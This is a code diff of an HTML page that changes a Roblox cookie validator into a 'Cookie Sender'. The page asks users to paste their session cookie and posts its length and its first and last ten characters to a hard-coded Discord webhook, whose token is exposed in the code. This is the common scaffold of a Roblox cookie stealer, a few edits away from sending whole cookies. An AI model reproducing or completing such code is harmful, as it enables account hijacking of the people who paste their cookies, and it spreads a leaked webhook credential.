@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox Cookie Checker</title>
+    <title>Roblox Cookie Sender</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -35,6 +35,7 @@
             font-size: 16px;
             border-radius: 4px;
             width: 100%;
+            margin-bottom: 15px;
         }
         #result {
             margin-top: 20px;
@@ -42,30 +43,30 @@
             border-radius: 4px;
             font-weight: bold;
         }
-        .valid {
-            background: #d5f5e3;
-            color: #27ae60;
-            border-left: 5px solid #2ecc71;
-        }
-        .invalid {
-            background: #fadbd8;
-            color: #e74c3c;
-            border-left: 5px solid #e74c3c;
-        }
+        .valid { background: #d5f5e3; color: #27ae60; border-left: 5px solid #2ecc71; }
+        .invalid { background: #fadbd8; color: #e74c3c; border-left: 5px solid #e74c3c; }
+        .sending { background: #fff3cd; color: #f39c12; border-left: 5px solid #f39c12; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Roblox Cookie Validator</h2>
+        <h2>Roblox Cookie Sender</h2>
         <textarea id="cookieInput" placeholder="Paste your _|WARNING:-DO-NOT-SHARE-THIS cookie here"></textarea>
-        <button onclick="validateCookie()">Validate Cookie</button>
-        <div id="result">Paste a cookie and click validate</div>
+        <button onclick="validateAndSend()">Validate & Send to Webhook</button>
+        <div id="result">Paste a cookie and click the button</div>
     </div>
 
     <script>
-        function validateCookie() {
+        // YOUR DISCORD WEBHOOK URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1394819865360990388/6m4yTDRWX74rS94nZTr-HBfbiTapkR16n0GQJbNbraho6rkE8GzBFapZTcfvKubL4nSb";
+
+        async function validateAndSend() {
             const cookie = document.getElementById('cookieInput').value.trim();
             const resultDiv = document.getElementById('result');
+            
+            // Reset status
+            resultDiv.className = "";
+            resultDiv.textContent = "Processing...";
             
             if (!cookie) {
                 resultDiv.textContent = "❌ Please paste a cookie";
@@ -73,20 +74,51 @@
                 return;
             }
 
-            // SIMPLE BUT EFFECTIVE VALIDATION
-            const isValid = (
-                cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS') && 
-                cookie.length > 500 && 
-                cookie.includes('|_') &&
-                cookie.includes('--')
-            );
-
-            if (isValid) {
-                resultDiv.textContent = `✅ VALID COOKIE (${cookie.length} chars)`;
-                resultDiv.className = "valid";
-            } else {
-                resultDiv.textContent = "❌ INVALID COOKIE FORMAT";
+            // Validate cookie format
+            if (!(cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS') && cookie.length > 500)) {
+                resultDiv.textContent = "❌ Invalid cookie format";
                 resultDiv.className = "invalid";
+                return;
+            }
+
+            // Prepare webhook payload
+            const payload = {
+                content: "🔐 New Cookie Submission",
+                embeds: [{
+                    title: "Roblox Cookie Data",
+                    description: "Cookie received from web validator",
+                    color: 0x3498db,
+                    fields: [
+                        { name: "Length", value: cookie.length.toString(), inline: true },
+                        { name: "First 10 chars", value: "```" + cookie.substring(0, 10) + "```", inline: true },
+                        { name: "Last 10 chars", value: "```" + cookie.substring(cookie.length - 10) + "```", inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Show sending status
+            resultDiv.textContent = "⏳ Sending to webhook...";
+            resultDiv.className = "sending";
+
+            try {
+                // Send to webhook
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    resultDiv.textContent = "✅ Successfully sent to webhook!";
+                    resultDiv.className = "valid";
+                } else {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+            } catch (error) {
+                resultDiv.textContent = `❌ Failed to send: ${error.message}`;
+                resultDiv.className = "invalid";
+                console.error("Webhook error:", error);
             }
         }
     </script>
